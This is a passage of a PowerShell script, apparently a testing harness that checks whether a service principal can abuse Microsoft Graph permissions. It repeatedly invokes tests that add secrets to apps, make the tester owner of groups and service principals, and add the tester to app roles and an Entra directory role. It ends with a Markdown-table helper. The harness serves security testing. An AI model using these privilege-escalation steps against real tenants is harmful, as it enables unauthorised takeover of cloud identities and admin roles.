                    -TargetGroupId      "abafdcb5-edb4-46f0-9c81-7af56e487a37" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $HeldPrivilege `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }

            MGAddMemberToNonRoleEligibleGroup {
                $ThreadSafeTest = (& ${global:Test-MGAddMemberToNonRoleEligibleGroup} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -TargetGroupId      "abafdcb5-edb4-46f0-9c81-7af56e487a37" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $HeldPrivilege `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }

            MGAddSelfAsOwnerOfSP {
                $ThreadSafeTest = (& ${global:Test-MGAddSelfAsOwnerOfSP} `
                    -TestPrincipalId $ThreadSafeSP.SPObjectId `
                    -TargetSPId         "09b51dd2-c780-4492-994a-1cbce1d66719" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $HeldPrivilege `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }

            MGAddSelfToMGAppRole {
                $ThreadSafeTest = (& ${global:Test-MGAddSelfToMGAppRole} `
                    -TestPrincipalId        $ThreadSafeSP.SPObjectId `
                    -MGAppRoleDefinitionId  "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" `
                    -TestToken              $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken     $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege          $HeldPrivilege `
                    -TestGUID               ${using:TestGUID} `
                    -TimeOfTest             $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }

            MGAddSelfToEntraRole {
                $ThreadSafeTest = (& ${global:Test-MGAddSelfToEntraRole} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -RoleDefinitionId   "62e90394-69f5-4237-9190-012177145e10" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $HeldPrivilege `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }
            
            # Run all tests by default if the user did not specify an AbuseTestType
            default {
                $ThreadSafeTest = (& ${global:Test-MGAddOwnerToRoleEligibleGroup} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -TargetGroupId      "59595334-99d7-4e83-93b3-0054859b3d50" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $HeldPrivilege `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)

                $ThreadSafeTest = (& ${global:Test-MGAddSecretToSP} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -TargetSPId         $ThreadSafeSP.SPObjectId `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $HeldPrivilege `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)

                $ThreadSafeTest = (& ${global:Test-MGAddSecretToApp} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -TargetAppId        "1aff018f-8fc0-48ac-a5bc-22dbc179150b" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $HeldPrivilege `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)

                $ThreadSafeTest = (& ${global:Test-MGAddMemberToRoleEligibleGroup} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -TargetGroupId      "59595334-99d7-4e83-93b3-0054859b3d50" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $HeldPrivilege `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)

                $ThreadSafeTest = (& ${global:Test-MGAddSelfAsOwnerOfApp} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -TargetAppId        "1aff018f-8fc0-48ac-a5bc-22dbc179150b" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $HeldPrivilege `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)

                $ThreadSafeTest = (& ${global:Test-MGAddOwnerToNonRoleEligibleGroup} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -TargetGroupId      "abafdcb5-edb4-46f0-9c81-7af56e487a37" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $HeldPrivilege `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)

                $ThreadSafeTest = (& ${global:Test-MGAddMemberToNonRoleEligibleGroup} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -TargetGroupId      "abafdcb5-edb4-46f0-9c81-7af56e487a37" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $HeldPrivilege `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)

                $ThreadSafeTest = (& ${global:Test-MGAddSelfAsOwnerOfSP} `
                    -TestPrincipalId $ThreadSafeSP.SPObjectId `
                    -TargetSPId         "09b51dd2-c780-4492-994a-1cbce1d66719" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $HeldPrivilege `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)

                $ThreadSafeTest = (& ${global:Test-MGAddSelfToMGAppRole} `
                    -TestPrincipalId        $ThreadSafeSP.SPObjectId `
                    -MGAppRoleDefinitionId  "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" `
                    -TestToken              $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken     $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege          $HeldPrivilege `
                    -TestGUID               ${using:TestGUID} `
                    -TimeOfTest             $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)

                $ThreadSafeTest = (& ${global:Test-MGAddSelfToEntraRole} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -RoleDefinitionId   "62e90394-69f5-4237-9190-012177145e10" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $HeldPrivilege `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)

            }
        }

        $ThreadSafeTest = (& ${global:Test-MGAddOwnerToRoleEligibleGroup} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetGroupId      "59595334-99d7-4e83-93b3-0054859b3d50" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $HeldPrivilege `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddSecretToSP} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetSPId         $ThreadSafeSP.SPObjectId `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $HeldPrivilege `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddSecretToApp} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetAppId        "1aff018f-8fc0-48ac-a5bc-22dbc179150b" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $HeldPrivilege `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddMemberToRoleEligibleGroup} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetGroupId      "59595334-99d7-4e83-93b3-0054859b3d50" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $HeldPrivilege `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddSelfAsOwnerOfApp} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetAppId        "1aff018f-8fc0-48ac-a5bc-22dbc179150b" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $HeldPrivilege `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddOwnerToNonRoleEligibleGroup} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetGroupId      "abafdcb5-edb4-46f0-9c81-7af56e487a37" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $HeldPrivilege `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddMemberToNonRoleEligibleGroup} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetGroupId      "abafdcb5-edb4-46f0-9c81-7af56e487a37" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $HeldPrivilege `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddSelfAsOwnerOfSP} `
            -TestPrincipalId $ThreadSafeSP.SPObjectId `
            -TargetSPId         "09b51dd2-c780-4492-994a-1cbce1d66719" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $HeldPrivilege `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddSelfToMGAppRole} `
            -TestPrincipalId        $ThreadSafeSP.SPObjectId `
            -MGAppRoleDefinitionId  "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" `
            -TestToken              $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken     $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege          $HeldPrivilege `
            -TestGUID               ${using:TestGUID} `
            -TimeOfTest             $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddSelfToEntraRole} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -RoleDefinitionId   "62e90394-69f5-4237-9190-012177145e10" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $HeldPrivilege `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)
    }
    $MGTestResults
}

## ################ ##
## Helper functions ##
## ################ ##

Function ConvertTo-Markdown {
    <#
    .Synopsis
        Converts a PowerShell object to a Markdown table.

        Author: Ben Neise (@BenNeise)
    .EXAMPLE
        $data | ConvertTo-Markdown
    .EXAMPLE
        ConvertTo-Markdown($data)
    .LINK
        https://twitter.com/BenNeise
        https://gist.github.com/BenNeise/4c837213d0f313715a93
    #>
    [CmdletBinding()]
    [OutputType([string])]
    Param (
        [Parameter(
            Mandatory = $true,
            Position = 0,
            ValueFromPipeline = $true
        )]
        [PSObject[]]$collection
    )

    Begin {
        $items = @()
        $columns = @{}
    }

    Process {
        ForEach($item in $collection) {
            $items += $item

            $item.PSObject.Properties | %{
                if(-not $columns.ContainsKey($_.Name) -or $columns[$_.Name] -lt $_.Value.ToString().Length) {
                    $columns[$_.Name] = $_.Value.ToString().Length
                }
            }
        }
    }

    End {
        ForEach($key in $($columns.Keys)) {
            $columns[$key] = [Math]::Max($columns[$key], $key.Length)
        }

        $header = @()
        ForEach($key in $columns.Keys) {
            $header += ('{0,-' + $columns[$key] + '}') -f $key
        }
        $header -join ' | '

        $separator = @()
        ForEach($key in $columns.Keys) {
            $separator += '-' * $columns[$key]
        }
        $separator -join ' | '

        ForEach($item in $items) {
            $values = @()
            ForEach($key in $columns.Keys) {
                $values += ('{0,-' + $columns[$key] + '}') -f $item.($key)
            }
            $values -join ' | '
        }
    }
}
